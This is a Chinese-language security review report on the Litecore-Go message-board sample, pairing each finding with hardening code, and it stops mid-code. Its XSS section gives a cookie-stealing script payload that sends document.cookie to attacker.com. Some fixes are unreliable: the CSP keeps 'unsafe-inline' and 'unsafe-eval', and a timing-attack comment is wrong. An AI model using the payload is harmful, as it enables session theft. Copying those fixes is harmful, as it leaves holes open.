# Litecore-Go 代码库安全审查报告

**审查日期**: 2026-01-19
**审查范围**: 全代码库
**审查工具**: 人工代码审查
**严重程度说明**:
- 🔴 严重：存在可被直接利用的安全漏洞
- 🟡 中等：存在潜在安全风险，建议修复
- 🔵 建议：符合最佳实践，建议改进

---

## 1. 敏感信息处理

### 🔴 严重：配置文件中硬编码管理员密码

**文件位置**: `samples/messageboard/configs/config.yaml:8`

**问题描述**:
```yaml
app:
  admin:
    password: "admin123"        # 管理员密码
```

**攻击场景**:
- 如果配置文件被提交到版本控制系统，密码将永久暴露在历史记录中
- 攻击者可通过泄露的配置文件获取管理员访问权限
- 密码 "admin123" 极其简单，易被暴力破解

**影响**: 完全的系统管理员权限被夺取

**修复建议**:
1. 将密码从配置文件中移除，使用环境变量或密钥管理服务
2. 强制要求复杂密码（至少12位，包含大小写字母、数字和特殊字符）
3. 首次启动时强制修改默认密码
4. 配置文件使用加密存储，运行时解密

**安全加固代码示例**:

```yaml
# samples/messageboard/configs/config.yaml
app:
  admin:
    # 不再存储密码，使用环境变量
    password_env: "LITECORE_ADMIN_PASSWORD"  # 从环境变量读取
    session_timeout: 3600
```

```go
// samples/messageboard/internal/services/auth_service.go
func (s *authService) VerifyPassword(password string) bool {
    // 从环境变量读取管理员密码哈希
    storedPasswordHash := os.Getenv("LITECORE_ADMIN_PASSWORD_HASH")
    if storedPasswordHash == "" {
        return false
    }

    // 使用bcrypt验证密码
    err := bcrypt.CompareHashAndPassword([]byte(storedPasswordHash), []byte(password))
    return err == nil
}
```

**首次启动密码设置工具**:

```go
// samples/messageboard/cmd/setup_password.go
func SetupAdminPassword() error {
    if os.Getenv("LITECORE_ADMIN_PASSWORD_HASH") != "" {
        fmt.Println("管理员密码已配置")
        return nil
    }

    fmt.Print("设置管理员密码: ")
    password, err := term.ReadPassword(int(syscall.Stdin))
    if err != nil {
        return err
    }
    fmt.Println()

    hashedPassword, err := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)
    if err != nil {
        return err
    }

    fmt.Printf("请将以下环境变量添加到配置中:\n")
    fmt.Printf("LITECORE_ADMIN_PASSWORD_HASH=%s\n", string(hashedPassword))

    return nil
}
```

---

### 🔴 严重：密码明文存储和比较

**文件位置**: `samples/messageboard/internal/services/auth_service.go:43-48`

**问题描述**:
```go
func (s *authService) VerifyPassword(password string) bool {
    storedPassword, err := config.Get[string](s.Config, "app.admin.password")
    if err != nil {
        return false
    }
    return password == storedPassword  // 明文比较
}
```

**攻击场景**:
- 如果数据库或配置文件被泄露，密码以明文形式暴露
- 员工或运维人员可轻易获取管理员密码
- 无法追溯密码泄露路径（无哈希）

**影响**: 密码泄露后无法察觉，攻击者可长期使用

**修复建议**:
使用bcrypt进行密码哈希存储和验证

**安全加固代码示例**:

```go
// samples/messageboard/internal/services/auth_service.go
import "golang.org/x/crypto/bcrypt"

func (s *authService) VerifyPassword(password string) bool {
    // 从配置或数据库读取存储的密码哈希
    storedPasswordHash, err := config.Get[string](s.Config, "app.admin.password_hash")
    if err != nil {
        s.Logger.Error("获取存储密码哈希失败", zap.Error(err))
        return false
    }

    if storedPasswordHash == "" {
        s.Logger.Warn("未配置管理员密码哈希")
        return false
    }

    // 使用bcrypt比较密码（自动处理盐值）
    err = bcrypt.CompareHashAndPassword(
        []byte(storedPasswordHash),
        []byte(password),
    )

    if err != nil {
        // 使用常数时间比较防止时序攻击
        return false
    }

    s.Logger.Info("管理员登录成功")
    return true
}

// 密码哈希生成工具
func HashPassword(password string) (string, error) {
    // 使用bcrypt.DefaultCost (cost=10)，生产环境建议使用12-14
    hashedPassword, err := bcrypt.GenerateFromPassword(
        []byte(password),
        bcrypt.DefaultCost,
    )
    if err != nil {
        return "", fmt.Errorf("密码哈希生成失败: %w", err)
    }
    return string(hashedPassword), nil
}
```

**密码复杂度验证**:

```go
// samples/messageboard/internal/services/auth_service.go
func (s *authService) ValidatePasswordComplexity(password string) error {
    if len(password) < 12 {
        return errors.New("密码长度至少12位")
    }

    var (
        hasUpper   bool
        hasLower   bool
        hasNumber  bool
        hasSpecial bool
    )

    for _, char := range password {
        switch {
        case unicode.IsUpper(char):
            hasUpper = true
        case unicode.IsLower(char):
            hasLower = true
        case unicode.IsNumber(char):
            hasNumber = true
        case unicode.IsPunct(char) || unicode.IsSymbol(char):
            hasSpecial = true
        }
    }

    missing := []string{}
    if !hasUpper {
        missing = append(missing, "大写字母")
    }
    if !hasLower {
        missing = append(missing, "小写字母")
    }
    if !hasNumber {
        missing = append(missing, "数字")
    }
    if !hasSpecial {
        missing = append(missing, "特殊字符")
    }

    if len(missing) > 0 {
        return fmt.Errorf("密码必须包含: %s", strings.Join(missing, "、"))
    }

    return nil
}
```

---

### 🟡 中等：会话密钥可能不够强

**文件位置**: `samples/messageboard/internal/services/session_service.go:54`

**问题描述**:
```go
func (s *sessionService) CreateSession() (string, error) {
    token := uuid.New().String()  // 使用UUID作为会话令牌
    // ...
}
```

**攻击场景**:
- UUIDv4虽然有128位熵，但部分版本存在可预测性
- 没有签名验证，令牌可被伪造
- 令牌泄露后无法吊销单个令牌

**影响**: 会话劫持，令牌伪造

**修复建议**:
使用JWT或签名的会话令牌，包含过期时间和签名

**安全加固代码示例**:

```go
// samples/messageboard/internal/services/session_service.go
import (
    "com.litelake.litecore/util/jwt"
    "time"
)

type SessionClaims struct {
    jwt.ILiteUtilJWTClaims
    SessionID string `json:"session_id"`
    AdminIP   string `json:"admin_ip"`  // 绑定IP增加安全性
}

func (s *sessionService) CreateSession(clientIP string) (string, error) {
    // 生成会话ID
    sessionID := uuid.New().String()

    // 创建JWT声明
    claims := jwt.JWT.NewMapClaims()
    jwt.JWT.SetIssuer(claims, "litecore-messageboard")
    jwt.JWT.SetSubject(claims, "admin")
    jwt.JWT.SetAudience(claims, "admin-api")
    jwt.JWT.SetExpiration(claims, time.Duration(s.timeout)*time.Second)
    jwt.JWT.SetIssuedAt(claims, time.Now())
    jwt.JWT.AddCustomClaim(claims, "session_id", sessionID)
    jwt.JWT.AddCustomClaim(claims, "admin_ip", clientIP)

    // 从环境变量获取JWT密钥（至少32字节）
    jwtSecret := os.Getenv("LITECORE_JWT_SECRET")
    if len(jwtSecret) < 32 {
        return "", errors.New("JWT密钥长度不足32字节")
    }

    // 生成JWT令牌
    token, err := jwt.JWT.GenerateHS256Token(claims, []byte(jwtSecret))
    if err != nil {
        return "", fmt.Errorf("生成JWT令牌失败: %w", err)
    }

    // 可选：在缓存中存储会话元数据（用于强制登出）
    sessionKey := fmt.Sprintf("session:%s", sessionID)
    sessionData := map[string]interface{}{
        "created_at": time.Now(),
        "ip":         clientIP,
    }
    if err := s.CacheMgr.Set(context.Background(), sessionKey, sessionData, time.Duration(s.timeout)*time.Second); err != nil {
        return "", fmt.Errorf("存储会话元数据失败: %w", err)
    }

    return token, nil
}

func (s *sessionService) ValidateSession(token string, clientIP string) (*dtos.AdminSession, error) {
    // 获取JWT密钥
    jwtSecret := os.Getenv("LITECORE_JWT_SECRET")
    if jwtSecret == "" {
        return nil, errors.New("JWT密钥未配置")
    }

    // 解析并验证JWT
    claims, err := jwt.JWT.ParseHS256Token(token, []byte(jwtSecret))
    if err != nil {
        return nil, fmt.Errorf("JWT令牌无效: %w", err)
    }

    // 验证声明
    if err := jwt.JWT.ValidateClaims(
        claims,
        jwt.WithIssuer("litecore-messageboard"),
        jwt.WithAudience("admin-api"),
    ); err != nil {
        return nil, fmt.Errorf("JWT声明验证失败: %w", err)
    }

    // 验证IP绑定（可选，增加安全性）
    storedIP, ok := claims["admin_ip"].(string)
    if ok && storedIP != "" && storedIP != clientIP {
        return nil, errors.New("会话IP不匹配")
    }

    // 检查会话是否被吊销（可选）
    sessionID, _ := claims["session_id"].(string)
    sessionKey := fmt.Sprintf("session:%s", sessionID)
    var sessionData map[string]interface{}
    if err := s.CacheMgr.Get(context.Background(), sessionKey, &sessionData); err != nil {
        return nil, errors.New("会话不存在或已吊销")
    }

    return &dtos.AdminSession{
        Token:     token,
        SessionID: sessionID,
        IP:        clientIP,
    }, nil
}
```

---

## 2. 输入验证

### 🟡 中等：XSS攻击防护不足

**文件位置**:
- `samples/messageboard/internal/entities/message_entity.go:14-15`
- `samples/messageboard/internal/services/html_template_service.go:40`

**问题描述**:
用户提交的留言内容和昵称在HTML模板渲染时未进行转义，存在XSS攻击风险。

```go
// message_entity.go
type Message struct {
    ID        uint      `gorm:"primarykey" json:"id"`
    Nickname  string    `gorm:"type:varchar(20);not null" json:"nickname"`
    Content   string    `gorm:"type:varchar(500);not null" json:"content"`
    // ...
}

// html_template_service.go
func (s *htmlTemplateService) Render(ctx *gin.Context, name string, data interface{}) {
    ctx.HTML(200, name, data)  // 直接渲染，未转义
}
```

**攻击场景**:
```html
<!-- 恶意留言内容 -->
<script>
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**影响**:
- 窃取管理员cookie，劫持会话
- 执行任意JavaScript代码
- 钓鱼攻击，窃取用户信息

**修复建议**:
1. 使用Gin的HTML自动转义（默认已启用）
2. 对用户输入进行XSS过滤
3. 使用Content Security Policy (CSP)头部
4. 限制允许的HTML标签

**安全加固代码示例**:

```go
// samples/messageboard/internal/services/message_service.go
import "github.com/microcosm-cc/bluemonday"

// 创建XSS过滤策略（全局单例）
var (
    strictSanitizer = bluemonday.StrictPolicy()
    htmlSanitizer   = bluemonday.UGCPolicy()
)

func init() {
    // UGC策略允许常见HTML标签但过滤危险内容
    htmlSanitizer.AllowStandardURLs()
    htmlSanitizer.AllowRelativeURLs()
    htmlSanitizer.RequireParseableURLs(true)
    htmlSanitizer.AllowElements("b", "i", "u", "em", "strong", "p", "br")
    htmlSanitizer.AllowAttributes("href").OnElements("a")
}

func (s *messageService) CreateMessage(nickname, content string) (*entities.Message, error) {
    // 参数验证
    if len(nickname) < 2 || len(nickname) > 20 {
        return nil, errors.New("昵称长度必须在2-20个字符之间")
    }
    if len(content) < 5 || len(content) > 500 {
        return nil, errors.New("留言内容长度必须在5-500个字符之间")
    }

    // XSS防护：昵称严格过滤（不允许任何HTML）
    sanitizedNickname := strictSanitizer.Sanitize(nickname)

    // XSS防护：内容使用UGC策略过滤
    sanitizedContent := htmlSanitizer.Sanitize(content)

    // 检查过滤后内容是否为空
    if sanitizedContent == "" {
        return nil, errors.New("留言内容包含无效字符")
    }

    // 创建消息实体
    message := &entities.Message{
        Nickname: sanitizedNickname,
        Content:  sanitizedContent,
        Status:   "pending",
    }

    if err := s.MessageRepo.Create(message); err != nil {
        return nil, fmt.Errorf("创建留言失败: %w", err)
    }

    return message, nil
}
```

**Content Security Policy头部配置**:

```go
// samples/messageboard/internal/middlewares/security_headers_middleware.go
func (m *securityHeadersMiddlewareImpl) Wrapper() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 启用CSP
        c.Writer.Header().Set("Content-Security-Policy",
            "default-src 'self'; "+
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "+
            "style-src 'self' 'unsafe-inline'; "+
            "img-src 'self' data: https:; "+
            "font-src 'self'; "+
            "connect-src 'self'; "+
            "frame-ancestors 'none'; "+
            "base-uri 'self'; "+
            "form-action 'self'")

        // 其他安全头部
        c.Writer.Header().Set("X-Content-Type-Options", "nosniff")
        c.Writer.Header().Set("X-Frame-Options", "DENY")
        c.Writer.Header().Set("X-XSS-Protection", "1; mode=block")
        c.Writer.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        c.Writer.Header().Set("Permissions-Policy", "geolocation=(), microphone=(), camera=()")

        c.Next()
    }
}
```

---

### 🟡 中等：SQL注入风险（低）

**文件位置**: `samples/messageboard/internal/repositories/message_repository.go`

**问题描述**:
虽然使用了GORM的参数化查询，但需要确保所有用户输入都通过参数化处理。

**修复建议**:
确保所有数据库查询都使用GORM的参数化方法（当前代码已正确实现，但需持续审查）。

```go
// 正确的参数化查询示例
func (r *messageRepository) GetByID(id uint) (*entities.Message, error) {
    db := r.Manager.DB()
    var message entities.Message
    err := db.First(&message, id).Error  // ✓ 参数化查询
    if err != nil {
        return nil, err
    }
    return &message, nil
}

func (r *messageRepository) GetApprovedMessages() ([]*entities.Message, error) {
    db := r.Manager.DB()
    var messages []*entities.Message
    err := db.Where("status = ?", "approved").  // ✓ 参数化查询
        Order("created_at DESC").
        Find(&messages).Error
    return messages, err
}
```

---

## 3. 加密与哈希

### 🔴 严重：未使用加密库实现密码哈希

**问题描述**:
项目提供了完善的加密库（`util/crypt/crypt.go`），包含bcrypt和PBKDF2实现，但在认证服务中完全未使用。

**文件位置**: `util/crypt/crypt.go:295-321`

**可用但未使用的功能**:
```go
// BcryptHash bcrypt密码哈希
func (c *cryptEngine) BcryptHash(password string, cost int) (string, error) {
    hashedBytes, err := bcrypt.GenerateFromPassword([]byte(password), cost)
    if err != nil {
        return "", fmt.Errorf("bcrypt hash failed: %w", err)
    }
    return string(hashedBytes), nil
}

// BcryptVerify bcrypt密码验证
func (c *cryptEngine) BcryptVerify(password, hash string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}

// PBKDF2Hash PBKDF2密码哈希
func (c *cryptEngine) PBKDF2Hash(password, salt string, iterations, keyLen int) string {
    return base64.StdEncoding.EncodeToString(
        pbkdf2.Key([]byte(password), []byte(salt), iterations, keyLen, sha256.New),
    )
}

// PBKDF2Verify PBKDF2密码验证
func (c *cryptEngine) PBKDF2Verify(password, salt, hash string, iterations, keyLen int) bool {
    expectedHash := c.PBKDF2Hash(password, salt, iterations, keyLen)
    return subtle.ConstantTimeCompare([]byte(hash), []byte(expectedHash)) == 1
}
```

**修复建议**:
立即使用项目中已有的bcrypt实现进行密码哈希

**安全加固代码示例**:

```go
// samples/messageboard/internal/services/auth_service.go
import (
    "com.litelake.litecore/util/crypt"
    "os"
)

type authService struct {
    Config         common.BaseConfigProvider `inject:""`
    SessionService ISessionService           `inject:""`
    Logger         *zap.Logger              `inject:""`
}

func (s *authService) VerifyPassword(password string) bool {
    // 从环境变量获取存储的密码哈希
    storedHash := os.Getenv("LITECORE_ADMIN_PASSWORD_HASH")
    if storedHash == "" {
        s.Logger.Error("未配置管理员密码哈希")
        return false
    }

    // 使用项目中已有的Crypt.BcryptVerify
    isValid := crypt.Crypt.BcryptVerify(password, storedHash)

    if !isValid {
        s.Logger.Warn("管理员密码验证失败")
        return false
    }

    return true
}

// 设置管理员密码的工具函数
func SetupAdminPassword(password string) (string, error) {
    // 验证密码复杂度
    if len(password) < 12 {
        return "", errors.New("密码长度至少12位")
    }

    // 使用bcrypt生成哈希（cost=12，平衡安全性和性能）
    hashedPassword, err := crypt.Crypt.BcryptHash(password, 12)
    if err != nil {
        return "", fmt.Errorf("密码哈希生成失败: %w", err)
    }

    return hashedPassword, nil
}

// 检查密码哈希强度
func CheckPasswordHashStrength(hash string) error {
    if len(hash) != 60 {
        return errors.New("bcrypt哈希长度应为60字符")
    }

    if !strings.HasPrefix(hash, "$2a$") && !strings.HasPrefix(hash, "$2b$") && !strings.HasPrefix(hash, "$2y$") {
        return errors.New("无效的bcrypt哈希格式")
    }

    // 提取cost值
    costStr := hash[4:6]
    cost, err := strconv.Atoi(costStr)
    if err != nil {
        return err
    }

    if cost < 10 {
        return fmt.Errorf("bcrypt cost值过小(%d)，建议至少10", cost)
    }

    return nil
}
```

---

### 🟡 中等：MD5和SHA1被用于非密码用途

**文件位置**: `util/hash/hash.go`

**问题描述**:
项目提供了MD5和SHA1哈希算法，虽然未用于密码存储，但仍需在文档中明确说明禁止用于密码哈希。

**修复建议**:
在代码注释和文档中明确标记MD5/SHA1的安全用途

**文档建议**:

```go
// Package hash 提供通用哈希算法工具
//
// 安全使用指南：
// - MD5: 仅用于数据完整性校验、文件指纹，严禁用于密码存储
// - SHA1: 仅用于兼容性场景，新代码应使用SHA256或更高
// - SHA256/SHA512: 推荐用于数据完整性、消息摘要等
// - 密码存储: 必须使用 util/crypt 包中的 Bcrypt 或 PBKDF2
//
// 示例：
//   // ✅ 正确：用于文件校验
//   fileHash := hash.Hash.SHA256String(fileContent)
//
//   // ❌ 错误：用于密码存储
//   passwordHash := hash.Hash.MD5String(password)  // 不安全！
//
//   // ✅ 正确：密码存储
//   passwordHash, _ := crypt.Crypt.BcryptHash(password, 12)
package hash
```

---

## 4. 认证授权

### 🟡 中等：认证中间件缺少速率限制

**文件位置**: `samples/messageboard/internal/middlewares/auth_middleware.go:34-81`

**问题描述**:
认证中间件只验证token，没有对登录尝试进行速率限制，容易被暴力破解。

**攻击场景**:
- 攻击者使用自动化工具进行密码暴力破解
- 没有登录失败次数限制，可无限尝试
- 可能导致服务器资源耗尽

**影响**:
- 管理员密码可能被暴力破解
- 拒绝服务攻击

**修复建议**:
添加登录速率限制和失败锁定机制

**安全加固代码示例**:

```go
// samples/messageboard/internal/middlewares/rate_limit_middleware.go
package middlewares

import (
    "com.litelake.litecore/common"
    "sync"
    "time"
)

type LoginAttempt struct {
    Count     int
    Locked    bool
    LockUntil time.Time
}

type RateLimitMiddleware struct {
    attempts map[string]*LoginAttempt
    mu       sync.RWMutex
    maxAttempts int
    lockDuration time.Duration
}

func NewRateLimitMiddleware(maxAttempts int, lockDuration time.Duration) *RateLimitMiddleware {
    return &RateLimitMiddleware{
        attempts:     make(map[string]*LoginAttempt),
        maxAttempts:  maxAttempts,      // 例如：5次
        lockDuration: lockDuration,     // 例如：30分钟
    }
}

func (m *RateLimitMiddleware) CheckLoginAttempt(ip string) (bool, error) {
    m.mu.Lock()
    defer m.mu.Unlock()

    attempt, exists := m.attempts[ip]
    if !exists {
        attempt = &LoginAttempt{Count: 0}
        m.attempts[ip] = attempt
    }

    // 检查是否被锁定
    if attempt.Locked && time.Now().Before(attempt.LockUntil) {
        remaining := time.Until(attempt.LockUntil).Minutes()
        return false, fmt.Errorf("登录失败次数过多，请%.0f分钟后重试", remaining)
    }

    // 如果锁定时间已过，重置
    if attempt.Locked && time.Now().After(attempt.LockUntil) {
        attempt.Count = 0
        attempt.Locked = false
    }

    return true, nil
}

func (m *RateLimitMiddleware) RecordFailedAttempt(ip string) {
    m.mu.Lock()
    defer m.mu.Unlock()

    attempt, exists := m.attempts[ip]
    if !exists {
        attempt = &LoginAttempt{Count: 0}
        m.attempts[ip] = attempt
    }

    attempt.Count++

    // 超过最大尝试次数，锁定
    if attempt.Count >= m.maxAttempts {
        attempt.Locked = true
        attempt.LockUntil = time.Now().Add(m.lockDuration)
    }
}

func (m *RateLimitMiddleware) RecordSuccessfulAttempt(ip string) {
    m.mu.Lock()
    defer m.mu.Unlock()

    delete(m.attempts, ip)
}
```

```go
// samples/messageboard/internal/controllers/admin_auth_controller.go
import (
    "github.com/gin-gonic/gin"
    "net"
)

type adminAuthControllerImpl struct {
    AuthService      services.IAuthService `inject:""`
    RateLimit        *RateLimitMiddleware `inject:""`
    Logger           *zap.Logger          `inject:""`
}

func (c *adminAuthControllerImpl) Handle(ctx *gin.Context) {
    // 获取客户端IP
    clientIP := ctx.ClientIP()

    // 检查速率限制
    allowed, err := c.RateLimit.CheckLoginAttempt(clientIP)
    if !allowed {
        c.Logger.Warn("登录尝试被限制",
            zap.String("ip", clientIP),
            zap.Error(err))
        ctx.JSON(429, dtos.ErrorResponse(429, err.Error()))
        return
    }

    var req dtos.LoginRequest
    if err := ctx.ShouldBindJSON(&req); err != nil {
        c.RateLimit.RecordFailedAttempt(clientIP)
        ctx.JSON(400, dtos.ErrBadRequest)
        return
    }

    // 验证密码
    token, err := c.AuthService.Login(req.Password, clientIP)
    if err != nil {
        c.RateLimit.RecordFailedAttempt(clientIP)
        c.Logger.Warn("管理员登录失败",
            zap.String("ip", clientIP),
            zap.Error(err))
        ctx.JSON(401, dtos.ErrorResponse(401, "管理员密码错误"))
        return
    }

    // 登录成功，清除失败记录
    c.RateLimit.RecordSuccessfulAttempt(clientIP)
    c.Logger.Info("管理员登录成功",
        zap.String("ip", clientIP))

    ctx.JSON(200, dtos.SuccessWithData(dtos.LoginResponse{
        Token: token,
    }))
}
```

---

### 🟡 中等：会话缺少强制登出机制

**文件位置**: `samples/messageboard/internal/services/session_service.go`

**问题描述**:
会话创建后只能等待过期，管理员无法主动登出所有会话（如检测到异常登录）。

**修复建议**:
添加会话版本机制和强制登出API

**安全加固代码示例**:

```go
// samples/messageboard/internal/services/session_service.go
type sessionService struct {
    Config    common.BaseConfigProvider `inject:""`
    CacheMgr  cachemgr.ICacheManager    `inject:""`
    Logger    *zap.Logger               `inject:""`

    timeout  int64
    version  int    // 会话版本，用于强制登出
}

func (s *sessionService) ForceLogoutAll() error {
    // 增加会话版本
    s.version++

    // 缓存当前版本
    versionKey := "session:version"
    if err := s.CacheMgr.Set(context.Background(), versionKey, s.version, 0); err != nil {
        return fmt.Errorf("更新会话版本失败: %w", err)
    }

    s.Logger.Info("强制登出所有会话", zap.Int("version", s.version))
    return nil
}

func (s *sessionService) ValidateSession(token string, clientIP string) (*dtos.AdminSession, error) {
    // 获取当前会话版本
    versionKey := "session:version"
    var currentVersion int
    if err := s.CacheMgr.Get(context.Background(), versionKey, &currentVersion); err != nil {
        currentVersion = 0  // 默认版本
    }

    // ... JWT验证逻辑 ...

    // 检查会话版本是否匹配
    sessionID, _ := claims["session_id"].(string)
    sessionKey := fmt.Sprintf("session:%s", sessionID)
    var sessionData map[string]interface{}
    if err := s.CacheMgr.Get(context.Background(), sessionKey, &sessionData); err != nil {
        return nil, errors.New("会话不存在或已吊销")
    }

    storedVersion, _ := sessionData["version"].(int)
    if storedVersion < currentVersion {
        return nil, errors.New("会话已失效，请重新登录")
    }

    return &dtos.AdminSession{...}, nil
}
```

```go
// samples/messageboard/internal/controllers/admin_session_controller.go
type AdminSessionController struct {
    SessionService services.ISessionService `inject:""`
}

func (c *AdminSessionController) ForceLogoutAll(ctx *gin.Context) {
    if err := c.SessionService.ForceLogoutAll(); err != nil {
        ctx.JSON(500, dtos.ErrorResponse(500, "强制登出失败"))
        return
    }

    ctx.JSON(200, dtos.SuccessResponse("已强制登出所有会话", nil))
}
```

---

## 5. 错误信息泄露

### 🟡 中等：部分控制器直接返回错误详情

**文件位置**: `samples/messageboard/internal/controllers/msg_create_controller.go:36-37`

**问题描述**:
```go
if err := ctx.ShouldBindJSON(&req); err != nil {
    ctx.JSON(400, dtos.ErrorResponse(400, err.Error()))  // 可能泄露内部错误
    return
}
```

**攻击场景**:
- 数据库错误信息可能暴露表结构
- 文件路径、包名等内部信息可能被获取
- 攻击者利用错误信息进行精准攻击

**影响**:
系统内部实现细节泄露，辅助攻击者进行更有效的攻击

**修复建议**:
对返回给客户端的错误信息进行过滤，仅返回用户友好的通用错误

**安全加固代码示例**:

```go
// samples/messageboard/internal/middlewares/error_handler_middleware.go
package middlewares

import (
    "github.com/gin-gonic/gin"
    "strings"
)

type ErrorResponse struct {
    Code    int         `json:"code"`
    Message string      `json:"message"`
    Details string      `json:"details,omitempty"`
    TraceID string      `json:"trace_id,omitempty"`
}

func sanitizeError(err error) string {
    if err == nil {
        return ""
    }

    errMsg := err.Error()

    // 过滤敏感信息的模式
    sensitivePatterns := []string{
        "password", "pwd", "secret",
        "sql", "mysql", "postgres", "sqlite",
        "driver", "dsn",
        "file://", "/etc/", "/var/",
    }

    errMsgLower := strings.ToLower(errMsg)
    for _, pattern := range sensitivePatterns {
        if strings.Contains(errMsgLower, pattern) {
            return "系统内部错误，请联系管理员"
        }
    }

    // 检查是否是已知的用户错误
    knownErrors := map[string]bool{
        "required":              true,
        "min":                   true,
        "max":                   true,
        "len":                   true,
        "invalid":              true,
        "not found":             true,
        "unauthorized":          true,
        "forbidden":             true,
    }

    for knownErr := range knownErrors {
        if strings.Contains(errMsgLower, knownErr) {
            return errMsg  // 返回用户友好的错误信息
        }
    }

    // 其他内部错误返回通用消息
    return "系统内部错误，请联系管理员"
}

type ErrorHandlerMiddleware struct{}

func NewErrorHandlerMiddleware() *ErrorHandlerMiddleware {
    return &ErrorHandlerMiddleware{}
}

func (m *ErrorHandlerMiddleware) Wrapper() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Next()

        // 检查是否有错误
        if len(c.Errors) > 0 {
            err := c.Errors.Last()
            sanitizedMsg := sanitizeError(err.Err)

            response := ErrorResponse{
                Code:    500,
                Message: sanitizedMsg,
                TraceID: getTraceID(c),
            }

            // 根据错误类型设置HTTP状态码
            if strings.Contains(sanitizedMsg, "unauthorized") {
                response.Code = 401
            } else if strings.Contains(sanitizedMsg, "forbidden") {
                response.Code = 403
            } else if strings.Contains(sanitizedMsg, "not found") {
                response.Code = 404
            } else if strings.Contains(sanitizedMsg, "invalid") || strings.Contains(sanitizedMsg, "required") {
                response.Code = 400
            }

            c.JSON(response.Code, response)
            c.Abort()
        }
    }
}

func getTraceID(c *gin.Context) string {
    // 从请求头或上下文中获取trace ID
    if traceID := c.GetHeader("X-Trace-ID"); traceID != "" {
        return traceID
    }
    return uuid.New().String()
}
```

```go
// samples/messageboard/internal/controllers/msg_create_controller.go
func (c *msgCreateControllerImpl) Handle(ctx *gin.Context) {
    var req dtos.CreateMessageRequest

    // 使用ShouldBindJSON，让中间件处理错误
    if err := ctx.ShouldBindJSON(&req); err != nil {
        ctx.JSON(400, dtos.ErrorResponse(400, "请求参数格式错误"))
        return
    }

    message, err := c.MessageService.CreateMessage(req.Nickname, req.Content)
    if err != nil {
        // 记录详细错误日志
        c.Error(err)  // 让错误处理中间件处理

        // 返回通用错误信息
        ctx.JSON(400, dtos.ErrorResponse(400, "留言提交失败"))
        return
    }

    ctx.JSON(200, dtos.SuccessResponse("留言提交成功，等待审核", gin.H{
        "id": message.ID,
    }))
}
```

---

### 🟡 中等：debug模式可能泄露敏感信息

**文件位置**: `samples/messageboard/configs/config.yaml:15`

**问题描述**:
```yaml
server:
  mode: "debug"  # debug模式会暴露更多信息
```

**攻击场景**:
- debug模式下Gin会输出详细堆栈跟踪
- 可能暴露文件路径、数据库连接信息等
- 生产环境可能意外开启debug模式

**修复建议**:
1. 强制生产环境使用release模式
2. 添加配置验证
3. debug模式添加额外认证

**安全加固代码示例**:

```go
// samples/messageboard/internal/application/engine.go
func validateServerMode(mode string) error {
    validModes := map[string]bool{
        "debug":  true,
        "release": true,
        "test":   true,
    }

    if !validModes[mode] {
        return fmt.Errorf("无效的server mode: %s，必须为 debug/release/test", mode)
    }

    // 检查是否在Kubernetes/Docker等容器环境
    if isContainerEnvironment() && mode == "debug" {
        return errors.New("容器环境不允许使用debug模式，请使用release模式")
    }

    return nil
}

func isContainerEnvironment() bool {
    // 检查是否在Kubernetes/Docker容器中运行
    if _, err := os.Stat("/.dockerenv"); err == nil {
        return true
    }
    if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
        return true
    }
    return false
}

func NewEngine(...) (*Engine, error) {
    // ... 初始化代码 ...

    // 验证server mode
    serverMode, _ := config.Get[string](configContainer, "server.mode")
    if err := validateServerMode(serverMode); err != nil {
        return nil, err
    }

    // 设置Gin模式
    gin.SetMode(serverMode)

    // 创建engine
    engine := &Engine{...}
    // ...
}
```

---

## 6. 依赖安全

### 🔵 建议：依赖版本安全扫描

**文件位置**: `go.mod`

**当前依赖状态**:
```
github.com/gin-gonic/gin v1.11.0
github.com/go-playground/validator/v10 v10.27.0
github.com/patrickmn/go-cache v2.1.0+incompatible
github.com/redis/go-redis/v9 v9.17.2
golang.org/x/crypto v0.44.0
gorm.io/gorm v1.31.1
```

**问题**:
- 部分依赖未指定精确版本（如 `+incompatible`）
- 未定期进行安全扫描
- 缺少依赖安全漏洞监控

**修复建议**:
1. 使用govulncheck进行漏洞扫描
2. 集成 Dependabot 或 Renovate 自动更新依赖
3. 在CI/CD流程中添加安全检查

**安全加固命令示例**:

```bash
# 使用govulncheck扫描已知漏洞
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# 使用snyk扫描依赖
npm install -g snyk
snyk test --file=go.mod

# 使用Trivy扫描
trivy fs --security-checks vuln,config .
```

**CI/CD配置示例** (`.github/workflows/security.yml`):

```yaml
name: Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
  schedule:
    - cron: '0 0 * * 0'  # 每周日执行

jobs:
  vulnerability-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.25'

      - name: Run govulncheck
        run: |
          go install golang.org/x/vuln/cmd/govulncheck@latest
          govulncheck ./...

      - name: Install Trivy
        run: |
          wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
          echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
          sudo apt-get update
          sudo apt-get install trivy

      - name: Run Trivy scan
        run: |
          trivy fs --security-checks vuln,config --exit-code 1 --severity HIGH,CRITICAL .

      - name: Report vulnerabilities
        if: failure()
        run: |
          echo "发现安全漏洞，请查看扫描报告"
          exit 1
```

---

## 7. 其他安全建议

### 🔵 建议：添加审计日志

**问题**: 当前系统缺少完整的操作审计日志

**修复建议**:
记录所有管理操作，包括：
- 登录/登出
- 留言审核
- 留言删除
- 配置修改

**安全加固代码示例**:

```go
// samples/messageboard/internal/services/audit_service.go
type AuditEvent struct {
    Timestamp time.Time `json:"timestamp"`
    UserID    string    `json:"user_id"`
    UserIP    string    `json:"user_ip"`
    Action    string    `json:"action"`
    Resource  string    `json:"resource"`
    Details   string    `json:"details"`
    Success   bool      `json:"success"`
}

type AuditService struct {
    Logger *zap.Logger `inject:""`
}

func (s *AuditService) Log(event *AuditEvent) {
    event.Timestamp = time.Now()

    s.Logger.Info("审计日志",
        zap.Time("timestamp", event.Timestamp),
        zap.String("user_id", event.UserID),
